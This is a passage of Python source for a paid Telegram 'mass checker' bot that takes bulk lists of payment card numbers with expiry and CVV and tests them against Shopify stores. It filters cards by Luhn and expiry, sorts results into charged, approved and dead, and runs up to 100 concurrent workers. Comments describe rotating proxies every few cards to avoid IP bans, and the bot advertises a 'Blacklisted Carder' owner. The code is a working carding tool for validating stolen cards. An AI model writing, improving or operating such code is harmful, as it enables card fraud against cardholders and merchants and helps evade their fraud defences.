            await send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name)
    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)

        _schedule_db(lambda: asyncio.to_thread(update_user_stats, user_id, False))
        if should_charge_credits:
            _schedule_db(lambda: asyncio.to_thread(deduct_credits_atomic, user_id, 1))
        # NOTE: NO update_progress_message() here. With 100 workers/user,
        # DEAD is by far the most common result (90%+ of cards) — calling
        # the update on every dead card would spam Telegram at ~16 calls/s
        # per user, instantly triggering flood control. The 1.5s background
        # updater below picks up the counter changes.
    elif result_status == "ERROR":
        session['errors'] += 1
        session['error_cards'].append(card_result_data)
        _schedule_db(lambda: asyncio.to_thread(update_user_stats, user_id, False))
        # Same rationale as DEAD above — let the background updater handle it.

    if is_session_stopped(session_id):
        return

    # Only force-update the progress message for RARE-but-important events
    # (CHARGED/APPROVED). For DEAD/ERROR — the common case — we rely on the
    # 1.5s background updater to refresh counters. Calling here unconditionally
    # was hitting Telegram at ~16 calls/s per user and triggering flood control.
    if result_status in ("CHARGED", "APPROVED"):
        await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        count = 0
        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('live_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (
                len(session.get('charged_cards', [])) +
                len(session.get('live_cards', [])) +
                len(session.get('dead_cards', [])) +
                len(session.get('error_cards', []))
            )

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            type_name = type_names.get(result_type, "")
            await callback.answer(f"❌ No {type_name} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)

        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emojis = {"charged": "💎", "live": "✅", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "𝗖𝗛𝗔𝗥𝗚𝗘𝗗", "live": "𝗟𝗶𝘃𝗲", "dead": "𝗗𝗲𝗮𝗱", "all": "𝗔𝗹𝗹"}

        emoji = type_emojis.get(result_type, "📁")
        label = type_labels.get(result_type, "𝗔𝗹𝗹")

        caption = (
            f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {label} {emoji}\n"
            f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <b>{total_count}</b>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀"
        )

        document = types.BufferedInputFile(file=file_content, filename=filename)

        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id,
                document=document,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=user_msg_id
            )
        except TelegramBadRequest as e:
            err_lower = str(e).lower()
            if "message to reply not found" in err_lower or "reply message not found" in err_lower:
                try:
                    document.seek(0)
                except Exception:
                    document = types.BufferedInputFile(file=file_content, filename=filename)
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise

    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)
        try:
            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except:
            pass

@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        session['status'] = "STOPPED"

        print(f"🛑 [MSH] Stop signal sent")
        logging.info(f"🛑 [MSH] Stop signal sent")

        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1

        await callback.answer("🛑 Stopping...", show_alert=False)

        print(f"🛑 [MSH] Cancelled {cancelled_count} tasks")
        logging.info(f"🛑 [MSH] Cancelled {cancelled_count} tasks")

        proxy_manager = session.get('proxy_manager')
        if proxy_manager:
            stats = proxy_manager.get_stats()
            print(f"📊 [ProxyManager Stats] Total: {stats['total_proxies']}, Active: {stats['active']}, Failed: {stats['failed']}, Uses: {stats['total_uses']}")
            logging.info(f"📊 [ProxyManager Stats] {stats}")

        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error stopping", show_alert=True)
        except:
            pass


@router.callback_query(MshRetryCallback.filter())
async def handle_retry_callback(callback: types.CallbackQuery, callback_data: MshRetryCallback):
    try:
        session_id = callback_data.session_id
        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if session['status'] == "CHECKING":
            await callback.answer("ℹ️ Already running", show_alert=True)
            return

        error_cards = session.get('error_cards', [])
        if not error_cards:
            await callback.answer("❌ No error cards to retry", show_alert=True)
            return

        retry_tuples = []
        for c in error_cards:
            cc_formatted = c.get('card', '')
            parts = cc_formatted.split('|')
            if len(parts) != 4:
                continue
            cc_num = parts[0]
            retry_tuples.append((cc_formatted, cc_num))

        if not retry_tuples:
            await callback.answer("❌ No valid error cards to retry", show_alert=True)
            return

        await callback.answer(f"🔁 Retrying {len(retry_tuples)} error cards...", show_alert=False)

        session['status'] = "CHECKING"
        session['total'] = len(retry_tuples)
        session['checked'] = 0
        session['approved'] = 0
        session['charged'] = 0
        session['dead'] = 0
        session['errors'] = 0
        session['live_cards'] = []
        session['dead_cards'] = []
        session['charged_cards'] = []
        session['error_cards'] = []
        session['tasks'] = []
        session['start_time'] = time.time()
        session['last_text'] = ""
        session['last_update_time'] = 0

        logging.info(f"🔁 [MSH] Retry session {session_id} - {len(retry_tuples)} error cards")

        asyncio.create_task(
            run_mass_checker(
                callback.bot,
                session_id,
                retry_tuples,
                session.get('user_obj'),
                session.get('plan_name')
            )
        )

    except Exception as e:
        logging.error(f"Error handling retry callback: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error retrying", show_alert=True)
        except:
            pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MODE SELECTION CALLBACK (Charged Only vs Approved+Charged)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshModeCallback.filter())
async def msh_mode_callback(callback: types.CallbackQuery, callback_data: MshModeCallback):
    pending_id = callback_data.pending_id
    mode = callback_data.mode  # "charged" or "approved"

    pending = MSH_PENDING.pop(pending_id, None)
    if not pending:
        try:
            await callback.answer("⚠️ Selection expired — run /msh again.", show_alert=True)
        except Exception:
            pass
        return

    user_id = callback.from_user.id
    # Only the same user who triggered /msh can pick the mode
    if pending["user"].id != user_id:
        try:
            await callback.answer("❌ Not your check.", show_alert=True)
        except Exception:
            pass
        # Put it back so the legitimate user can still pick
        MSH_PENDING[pending_id] = pending
        return

    # Notify-mode: "charged" → suppress approved messages; "approved" → send both
    try:
        await callback.answer(
            "🔥 Charged Only" if mode == "charged" else "✅ Approved + Charged",
            show_alert=False,
        )
    except Exception:
        pass

    # Edit the prompt message to confirm the choice, then start the check
    try:
        choice_text = (
            f"🔥 <b>Charged Only</b>" if mode == "charged"
            else f"✅ <b>Approved + Charged</b>"
        )
        await callback.message.edit_text(
            f"<tg-emoji emoji-id=\"{EMOJI_CROWN}\">👑</tg-emoji> "
            f"<b>𝗠𝗼𝗱𝗲 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 ➛</b> {choice_text}\n"
            f"<i>Starting mass check…</i>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    notify_mode = "charged_only" if mode == "charged" else "all_approved"

    # Launch the actual background check with the chosen notify-mode
    asyncio.create_task(
        process_mass_check_background(
            pending["message"],
            pending["bot"],
            pending["valid_cards"],
            pending["user"],
            pending["user_proxies"],
            pending["is_group"],
            notify_mode=notify_mode,
        )
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    bot = message.bot
    admin = is_admin(user_id)

    if not admin and not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("🚧 <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    if not admin:
        is_premium, _ = get_premium_status(user_id)
        if not is_premium:
            await message.reply(
                "💎𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗳𝗲𝗮𝘁𝘂𝗿𝗲.\n\n👉 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 <a href=\"https://t.me/blacklistedcarder1\">owner</a> 𝘁𝗼 𝘂𝗽𝗴𝗿𝗮𝗱𝗲.",
                parse_mode="HTML"
            )
            return

    is_checking = False
    for session_id, session_data in list(MSH_SESSIONS.items()):
        if session_data.get('user_id') == user_id and session_data.get('status') == "CHECKING":
            is_checking = True
            break

    if is_checking:
        await message.reply(
            "⚠️ <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
            "You have a check running.\n"
            "Use the <b>🛑 Stop</b> button to stop it.",
            parse_mode="HTML"
        )
        return

    # Get user proxies
    try:
        user_col = get_collection("users")
        user_data = user_col.find_one({"user_id": user_id})
        user_proxies = user_data.get("proxies", []) if user_data else []
        if not user_proxies:
            user_proxies = load_global_proxies_http()
    except Exception as e:
        logging.error(f"Error loading proxies: {e}")
        user_proxies = load_global_proxies_http()

    if not user_proxies:
        await message.reply("⚠️ No proxies available. Please add proxies using /proxy command.")
        return

    # ── Collect raw text from command, reply, caption, and/or attached file ──

    raw_text = ""

    # Command inline text (works whether the trigger came via .text or .caption)
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    # Text / caption from a replied-to message
    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    # Document: prefer the current message's attachment, then a replied-to doc
    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    if document:
        if document.file_size > 2 * 1024 * 1024:
            await message.reply("❌ File too large. Max 2MB.")
            return
        try:
            file_info = await bot.get_file(document.file_id)
            byte_content = await bot.download_file(file_info.file_path)
            if byte_content:
                data = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/msh cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/msh</code>\n"
            "• Send .txt file with <code>/msh</code>",
            parse_mode="HTML"
        )
        return

    # ── Extract & validate cards here so we can check credits upfront ──
    extracted_cards = extract_cards(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found.")
        return

    valid_cards = []
    expired_count = 0
    invalid_luhn_count = 0

    # ── Card-count cap ─────────────────────────────────────────
    # Default: 2000 cards per /msh (Telegram rate-limit safe + sane memory).
    # Admin:    unlimited (no cap, /msh accepts however many cards were sent).
    # /unlimitedchk target: 10000 cards per /msh (10× normal premium cap).
    # Premium:  same 2000 (premium is just "no credit charge", not unlimited).
    #
    # We compute the cap ONCE here, factoring in admin + unlimited_msh,
    # so the loop below applies it consistently.
    is_unl_msh_for_cap = is_unlimited_msh(user_id)
    if admin:
        MAX_VALID_CARDS = 10_000_000   # effectively unlimited for admin
    elif is_unl_msh_for_cap:
        MAX_VALID_CARDS = 10_000       # /unlimitedchk target: 10k per /msh
    else:
        MAX_VALID_CARDS = 2000        # regular + premium default

    for card_string in extracted_cards:
        if len(valid_cards) >= MAX_VALID_CARDS:
            break
        parts_c = card_string.split('|')
        if len(parts_c) != 4:
            continue
        cc, mm, yy, cvv = parts_c
        if not luhn_check(cc):
            invalid_luhn_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        filter_info = ""
        if expired_count > 0 or invalid_luhn_count > 0:
            filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
        await message.reply(f"{filter_info}❌ No valid cards to check.", parse_mode="HTML")
        return

    # ── Credit check: admin and /unlimitedchk users skip this ──
    # Admins always skip (set by is_admin above). /unlimitedchk targets
    # are flagged via the `unlimited_msh` field in the users collection
    # and also skip here. Premium users still get charged unless they
    # were ALSO granted unlimited_msh by the admin.
    if not admin and not is_unl_msh_for_cap:
        is_prem_msh, _ = get_premium_status(user_id)
        if not is_prem_msh:
            current_credits = await asyncio.to_thread(get_user_credits, user_id)
            if current_credits < total_cards:
                await message.reply(
                    f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
                    f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
                    f"Your balance: <b>{current_credits}</b> credits.\n\n"
                    f"Please add more credits or reduce the number of cards.",
                    parse_mode="HTML"
                )
                return

    # Detect if the command was sent from a group or supergroup
    is_group = message.chat.type in ("group", "supergroup", "channel")

    # ── Ask user to pick a notify mode before launching ──
    pending_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    MSH_PENDING[pending_id] = {
        "message": message,
        "bot": bot,
        "valid_cards": valid_cards,
        "user": user,
        "user_proxies": user_proxies,
        "is_group": is_group,
        "total_cards": total_cards,
    }

    crown  = '👑'
    fire   = '🔥'
    blue   = '✅'

    prompt_text = (
        f"{crown} <b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ➛ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗠𝗼𝗱𝗲</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>Cards Ready ➛</b> <code>{total_cards}</code>\n"
        f"<b>Gateway ➛</b> Shopify\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{fire} <b>Charged Only</b> — notify only on real charges\n"
        f"{blue} <b>All Approved</b> — notify on approved + charged\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{crown} <b><a href=\"https://t.me/blacklistedcarder1\">Blacklisted Carder</a></b>"
    )

    mode_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="🔥 Charged Only",
                callback_data=MshModeCallback(pending_id=pending_id, mode="charged").pack(),
            ),
        ],
        [
            InlineKeyboardButton(
                text="✅ Approved + Charged",
                callback_data=MshModeCallback(pending_id=pending_id, mode="approved").pack(),
            ),
        ],
    ])

    await message.reply(prompt_text, parse_mode="HTML", reply_markup=mode_kb, disable_web_page_preview=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(
    message: types.Message,
    bot: Bot,
    valid_cards: list,
    user_obj,
    user_proxies,
    is_group: bool = False,
    notify_mode: str = "all_approved",  # "charged_only" | "all_approved"
):
    """
    Receives a pre-validated list of (card_string, cc_num) tuples.
    Card extraction, Luhn/expiry validation, and credit checks are all
    performed upfront in msh_command before this task is launched.
    """
    user_id = user_obj.id
    chat_id = message.chat.id

    total_cards = len(valid_cards)
    if total_cards == 0:
        await message.reply("❌ No valid cards to check.", parse_mode="HTML")
        return

    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)

    # ── Resolve premium + unlimited flags ONCE here ──
    # process_single_card is called per-card (1000s of times per session).
    # The original code called get_premium_status() and is_unlimited_msh()
    # synchronously on the event loop inside process_single_card, which
    # hit MongoDB on every card. With 35 concurrent workers per user that
    # stalled the event loop and visibly delayed the DM that gets sent on
    # every charge.
    is_prem_at_start = get_premium_status(user_id)[0]
    is_unl_at_start = is_unlimited_msh(user_id)

    proxy_manager = ProxyManager(user_proxies, session_id)
    proxy_stats = proxy_manager.get_stats()

    logging.info(f"🔄 [MSH] Session {session_id} initialized with ProxyManager: {proxy_stats['total_proxies']} proxies (normalized)")

    initial_text = _build_progress_caption(
        {
            "status": "CHECKING",
            "start_time": time.time(),
            "checked": 0,
            "total": total_cards,
            "approved": 0,
            "charged": 0,
            "dead": 0,
            "errors": 0,
            "proxy_manager": proxy_manager,
        },
        session_id,
    )

    initial_buttons = get_result_buttons(session_id, is_running=True)

    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)

    MSH_SESSIONS[session_id] = {
        "session_id": session_id,
        "status": "CHECKING",
        "chat_id": chat_id,
        "user_id": user_id,
        "msg_id": progress_msg.message_id,
        "user_msg_id": message.message_id,
        "total": total_cards,
        "checked": 0,
        "approved": 0,
        "charged": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time(),
        "tasks": [],
        "proxies": user_proxies,
        "proxy_manager": proxy_manager,
        "bad_proxies": [],
        "last_text": "",
        "last_update_time": 0,
        "live_cards": [],
        "dead_cards": [],
        "charged_cards": [],
        "error_cards": [],
        "user_obj": user_obj,
        "plan_name": plan_name,
        "is_group": is_group,  # Track whether started from a group
        "notify_mode": notify_mode,  # "charged_only" | "all_approved"
        # ── Cached user status (resolved ONCE at session start) ──
        # Avoids per-card MongoDB queries in process_single_card which
        # would block the event loop and stall all parallel workers.
        "_is_admin_cached": is_admin(user_id),
        "_is_premium_cached": is_prem_at_start,
        "_is_unlimited_cached": is_unl_at_start,
        # ── Background DB-task tracker ──
        # Keeps strong refs to fire-and-forget DB writes so they don't get
        # garbage collected mid-flight. Used for stats / credits updates
        # that don't need to block the user-visible DM.
        "_db_tasks": [],
        # ── Sites cache — loaded ONCE at session start, reused for all cards
        # Previously get_sites() was called inside process_single_card (on
        # EVERY retry, every card), causing repeated disk I/O under heavy load.
        # Now we load once here and reuse the cached list throughout the session.
        "sites_list": get_sites(),
    }

    print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Proxies: {len(user_proxies)} - Group: {is_group}")
    logging.info(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Proxies: {len(user_proxies)} - Group: {is_group}")

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))

async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session: return

    async def process_one(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        # Per-user concurrency is DYNAMIC — shrinks when the global
        # breaker is OPEN (APIs failing), grows back when they recover.
        # This stops 70 workers hammering a sick backend.
        # Pin the caller session so the proxy-pool cap reads this
        # session's proxy_manager, not some other active session.
        user_sem = await _acquire_slot_for_session(session_id)
        async with user_sem:
            if is_session_stopped(session_id):
                return
            await _adaptive_api_throttle()
            if is_session_stopped(session_id):
                return
            async with _GLOBAL_API_SEMAPHORE:
                if is_session_stopped(session_id):
                    return
                try:
                    await process_single_card(
                        session_id, cc_formatted, cc_num,
                        session['user_id'], bot, user_obj, plan_name
                    )
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    if not is_session_stopped(session_id):
                        logging.error(f"Worker error for {cc_formatted}: {e}")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # SLIDING-WINDOW TASK SPAWN (producer-consumer)
    #
    # Previously every card was wrapped in an asyncio.Task at t=0, so
    # 2000 tasks all entered the worker() immediately. Even though
    # only N ran concurrently (semaphore-limited), ALL 2000 of them
    # ran `_adaptive_api_throttle()` → did a 300-entry deque scan
    # → scheduled a 20-150ms sleep timer. That's ~2000 wasted deque
    # scans + 2000 sleep timers at startup, multiplied across 15
    # concurrent users → huge wasted CPU and event-loop pressure.
    #
    # Now: keep `_PER_USER_API_CONCURRENCY` long-lived worker tasks.
    # Each worker grabs the next card from an asyncio.Queue when it
    # becomes free. Only the workers that are about to call the API
    # do the throttle work — others just sit waiting on the queue
    # (free, zero CPU). This eliminates the startup thundering-herd
    # WITHOUT raising concurrency caps → no extra API load.
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    queue: asyncio.Queue = asyncio.Queue()
    sentinel = None  # poison pill to tell workers to exit
    for card_tuple in cards:
        queue.put_nowait(card_tuple)

    print(f"📋 [MSH] {queue.qsize()} cards queued for {session_id}")
    logging.info(f"📋 [MSH] {queue.qsize()} cards queued for {session_id}")

    async def worker_loop():
        try:
            while True:
                if is_session_stopped(session_id):
                    return
                item = await queue.get()
                if item is sentinel:
                    queue.task_done()
                    return
                cc_formatted, cc_num = item
                try:
                    await process_one(cc_formatted, cc_num)
                finally:
                    queue.task_done()
        except asyncio.CancelledError:
            return

    # Spawn long-lived workers (one per concurrency slot)
    workers = [
        asyncio.create_task(worker_loop(), name=f"msh_w_{session_id}_{i}")
        for i in range(_PER_USER_API_CONCURRENCY)
    ]
    session['tasks'].extend(workers)

    # ━━━ Background progress updater ━━━━━━━━━━━━━━━━━━━━━━━
    # Independent task that updates the progress message every 1.5s,
    # REGARDLESS of what the workers are doing. This guarantees the
    # progress bar keeps moving even when:
    #   • All 100 workers are waiting on the circuit breaker pause
    #   • Workers are blocked on the API breaker throttle
    #   • Many cards finish simultaneously and flood-control triggers
    # Workers also call update_progress_message, but this is the
    # SAFETY NET — if those calls fail or get throttled, this task
    # still pushes fresh data to the user.
    #
    # Tick lowered from 3s → 1.5s so the bar feels live even when the
    # worker-initiated updates are getting rate-limited. The
    # update_progress_message() function still has its own per-session
    # throttle (1s minimum) so we won't hammer Telegram.
    async def progress_updater_loop():
        try:
            while True:
                if is_session_stopped(session_id):
                    return
                sess = MSH_SESSIONS.get(session_id)
                if not sess or sess['status'] != "CHECKING":
                    return
                try:
                    await update_progress_message(bot, session_id)
                except Exception as e:
                    logging.debug(f"[MSH] bg progress updater error: {e}")
                # 1.5s tick — fast enough to feel live, slow enough that
                # Telegram's per-chat edit limit (~1/sec) doesn't trigger
                # when admin /sessions or charged hits are also being
                # sent to the same chat. Combined with the 1s internal
                # throttle in update_progress_message(), worst case is
                # one edit per ~1s which stays well under the limit.
                await asyncio.sleep(1.5)
        except asyncio.CancelledError:
            return

    progress_updater = asyncio.create_task(
        progress_updater_loop(), name=f"msh_progress_{session_id}"
    )
    session['tasks'].append(progress_updater)

    # Wait for queue to drain or session to be stopped
    try:
        await queue.join()
    except asyncio.CancelledError:
        pass

    # Stop the background progress updater
    progress_updater.cancel()
    try:
        await progress_updater
    except (asyncio.CancelledError, Exception):
        pass

    # Signal workers to exit
    for _ in workers:
        try:
            queue.put_nowait(sentinel)
        except Exception:
            pass

    # Cancel any workers still alive (e.g. on stop)
    for w in workers:
        if not w.done():
            w.cancel()

    # Drain worker exits
    results = await asyncio.gather(*workers, return_exceptions=True)
    cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
    errors = sum(
        1 for r in results
        if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError)
    )
    if cancelled > 0:
        print(f"🛑 [MSH] {cancelled} worker(s) cancelled")
    if errors > 0:
        logging.error(f"[MSH] {errors} worker(s) failed with exceptions")

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"

    await update_progress_message(bot, session_id)

    print(f"✅ [MSH] Session {session_id} finished")
    logging.info(f"✅ [MSH] Session {session_id} finished")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY ROTATION & HEALTH TRACKING (Tier 1)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_proxy_rotation_counter: dict = {}
_proxy_rotation_lock = asyncio.Lock()

async def get_next_proxy_with_rotation(session_id: str, proxy_manager) -> tuple:
    """Smart proxy rotation: rotate every 5-8 cards to prevent IP bans."""
    global _proxy_rotation_counter
    
    async with _proxy_rotation_lock:
        count = _proxy_rotation_counter.get(session_id, 0)
        count += 1
        
        rotate_after = random.randint(5, 8)
        should_rotate = count > rotate_after
        
        if should_rotate:
            _proxy_rotation_counter[session_id] = 0
        else:
            _proxy_rotation_counter[session_id] = count
    
    proxy_result = proxy_manager.get_next_proxy()
    if not proxy_result:
        return None, False
    
    proxy, _ = proxy_result
    
    try:
        from database import get_proxy_health
        health = await get_proxy_health(proxy)
        if health.get("status") == "DEAD":
            logging.debug(f"[MSH] Skipping DEAD proxy: {proxy}")
            return None, False
    except Exception as e:
        logging.debug(f"[MSH] Error checking proxy health: {e}")
    
    return proxy, should_rotate


async def notify_admin_proxy_change(proxy_url: str, is_dead: bool, reason: str, bot: Bot, admin_ids: set) -> None:
    """Notify admins when proxy status changes."""
    from proxy import notify_admin_proxy_status_change
    
    try:
        await notify_admin_proxy_status_change(
            proxy_url=proxy_url,
            is_dead=is_dead,
            reason=reason,
            bot=bot,
            admin_ids=admin_ids
        )
    except Exception as e:
        logging.error(f"[MSH] Error notifying admin: {e}")


async def record_proxy_outcome_and_check_health(proxy: str, success: bool, latency_ms: float, error_reason: str = None, bot: Bot = None, admin_ids: set = None) -> None:
    """Track proxy outcome and notify admin if status changes."""
    from proxy import check_and_update_proxy_health
    
    try:
        result = await check_and_update_proxy_health(proxy, success, latency_ms, error_reason)
        
        if result.get("status_changed"):
            old_status = result.get("old_status")
            new_status = result.get("new_status")
            
            if new_status == "DEAD" and old_status == "LIVE":
                await notify_admin_proxy_change(
                    proxy_url=proxy,
                    is_dead=True,
                    reason=error_reason or f"{result.get('failure_count', 0)} consecutive failures",
                    bot=bot,
                    admin_ids=admin_ids
                )
            elif new_status == "LIVE" and old_status == "DEAD":
                await notify_admin_proxy_change(
                    proxy_url=proxy,
                    is_dead=False,
                    reason="Cooldown expired, testing resumed",
                    bot=bot,
                    admin_ids=admin_ids
                )
    except Exception as e:
        logging.error(f"[MSH] Error recording proxy outcome: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROCESSING HEADER UPDATE (Live counter updates)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def update_processing_header(bot: Bot, session_id: str, site_name: str = "Shopify") -> None:
    """
    Update the processing header with live counts.
    
    Format:
    Shopify | TOTAL 75
    ✅ Live : 3 | ❌ Dead : 2 | ⚠️ Error : 1
    """
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return
    
    total = session.get('checked', 0)
    live = session.get('approved', 0)
    dead = session.get('dead', 0)
    charged = session.get('charged', 0)
    errors = session.get('errors', 0)
    
    # Update the header message
    header_text = (
        f"{site_name} | TOTAL {total}\n"
        f"✅ Live : {live} | ❌ Dead : {dead} | ⚠️ Error : {errors}"
    )
    
    if session.get('header_msg_id'):
        try:
            await bot.edit_message_text(
                chat_id=session['user_id'],
                message_id=session['header_msg_id'],
                text=header_text,
                parse_mode="HTML"
            )
        except Exception as e:
            logging.debug(f"[MSH] Could not update header: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ERROR RECHECK CALLBACK (User clicks Error button)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def recheck_error_cards(session_id: str, bot: Bot, user_obj) -> None:
